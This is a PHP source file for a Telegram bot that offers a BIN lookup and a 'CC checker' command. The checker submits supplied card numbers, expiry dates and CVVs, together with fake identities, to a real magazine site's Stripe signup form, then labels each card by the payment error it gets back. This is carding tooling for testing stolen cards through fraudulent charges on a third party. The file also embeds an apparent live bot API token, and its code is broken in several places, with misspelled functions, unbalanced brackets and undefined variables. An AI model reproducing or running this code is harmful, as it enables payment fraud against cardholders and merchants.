<?php
    date_default_timezone_set("Asia/kolkata");
    //Data From Webhook
    $content = file_get_contents("php://input");
    $update = json_decode($content, true);
    $chat_id = $update["message"]["chat"]["id"];
    $message = $update["message"]["text"];
    $id = $update["message"]["from"]["id"];
    $username = $update["message"]["from"]["username"];
    $firstname = $update["message"]["from"]["first_name"];
    $message_id = $upadte["message"]["message_id"];

    //Start message
if (strpos($message, "/start") === 0){
sendMessage($chat_id, "<b>Hey $firstname  \nUse To Check Commands  \nBot by @sohamnavale1</b>", $message_id
    );

}

elseif (strpos($message, "/use") === 0) {
sendMessage($chat_id, "<u>Bin lookup:</u> <code>/bin</code> xxxxxx%0A<u>CC Checker :</u> <code>/soham</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A", $message_id);
}


//Bin Lookup
elseif (strpos($message, "/bin") === 0){
$bin = substr($message, 5);
$curl = curl_init();
curl_setopt_array($curl, [
CURLOPT_URL => "https://lookup.binlist.net/".$bin,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_ENCODING => "",
CURLOPT_MAXREDIRS => 10,
CURLOPT_TIMEOUT => 30,
CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
CURLOPT_CUSTOMREQUEST => "GET",
CURLOPT_HTTPHEADER => [
	"authority: lookup.binlist.net",
	"accept: application/json",
	"accept-language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
	"origin: https://binlist.net",
	"https://binlist.net/",
	"sec-fetch-dest: empty",
	"sec-fetch-site: same-site"
	],
]);

$result = curl_exec($curl);
curl_close($curl);
$fim = json_decode($result, true);
$bank = strtoupper($fim['bank']['name']);
$scheme1 = strtoupper($fim['scheme']);
$country1 = strtoupper($fim['country']['alpha2']);
$emoji = strtoupper($fim['country']['emoji']);
$type = strtoupper($fim['type']);
$brand = strtoupper($fim['brand']);
$currency = strtoupper($fim['country']['currency']);
if ($scheme != null) {
sendMessage($chat_id, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>', $message_id);
}
else {
    send_MDmessage($chat_id, "Enter Valid BIN");
}

elseif (strpos($message, "/soham") === 0){
$lista = substr($message, 6);
$separa = explode("|", $lista);
$cc = $i[0];
$mes = $i[1];
$ano = $i[2];
$cvv = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = strtoupper($fim['bank']['name']);
$scheme1 = strtoupper($fim['scheme']);
$country1 = strtoupper($fim['country']['alpha2']);
$emoji = strtoupper($fim['country']['emoji']);
$type = strtoupper($fim['type']);
$brand = strtoupper($fim['brand']);
$currency = strtoupper($fim['country']['currency']);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat='.$country1.'');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$country = value($resposta, '"nat":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://canadianteachermagazine.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: canadianteachermagazine.com',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://canadianteachermagazine.com',
'referer: https://canadianteachermagazine.com/register/',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  'action=arm_membership_setup_form_ajax_action&form_random_key=1_x8YM5HVtHA&setup_id=1&setup_action=membership_setup&arm_user_old_plan=0&arm_is_user_logged_in_flag=0&arm_front_plan_skin_type=&subscription_plan=2&arm_plan_type=recurring&arm_payment_cycle_plan_3=0&payment_cycle_3=0&user_login='.$firstname.'cufhba&first_name='.$firstname.'juiowd+&last_name='.$lastname.'fhsbcub&user_email='.$firstname.'bubub@gmail.com&user_pass=soham%409205&arm_action=please-signup&redirect_to=https%3A%2F%2Fcanadianteachermagazine.com&isAdmin=0&referral_url=https%3A%2F%2Fcanadianteachermagazine.com&arm_form_id=101&form_filter_kp=211&form_filter_st=1610618889&arm_nonce_check='.$nonce.'&arm_front_gateway_skin_type=radio&payment_gateway=stripe&arm_payment_mode%5Bstripe%5D=both&stripe%5Bcard_holder_name%5D='.$firstname.'baxiu+'.$lastname.'sciu&stripe%5Bcard_number%5D='.$cc.'&stripe%5Bexp_month%5D='.$mon.'&stripe%5Bexp_year%5D='.$year.'&stripe%5Bcvc%5D='.$cvv.'&arm_selected_payment_mode=auto_debit_subscription&arm_total_payable_amount=9.99&arm_zero_amount_discount=0.00&gqptwq87=');
$result23 = curl_exec($ch);

$nonce = trim(strip_tags(getstr($result23,'"arm_nonce_check":"','"')));

if(strpos($result23, "Your card required Stripe 3D authentication. Recommend to use Stripe SCA Method")){
sendMessage($chat_id, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CVV MATCHED</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
elseif (strpos($result23, "security code is incorrect.")){
sendMessage($chat_id, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CCN MATCHED</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
elseif (strpos($result23, "Your card has insufficient funds.")){
sendMessage($chat_id, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CCN MATCHED</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
elseif (strops($result23, "Your card has expired."){
sendMessage($chat_id, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Card Has Expired</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
elseif (strops($result23, "Your card number is incorrect."){
sendMessage($chat_id, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Card Number Is Incorrect</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
elseif (strops($result23, "Your card was declined."){
sendMessage($chat_id, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Card Has Been Declined</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
elseif (strops($result23, "Your card does not support this type of purchase."){
sendMessage($chat_id, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Does Not Support Purchase</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
else{
sendMessage($chat_id, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u><b>Error Not listed</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
};
// Add more responses if you want
curl_close($ch);

}    


    
//Send Messages with Markdown (Global)
      function send_MDmessage($chat_id, $message){
       $apiToken = "1618781959:AAEITz6O-SlKILmQjFefwD4RvwFudUuWQxg";
        $text = urlencode($message);
        file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text&parse_mode=Markdown");
    }
    
?>
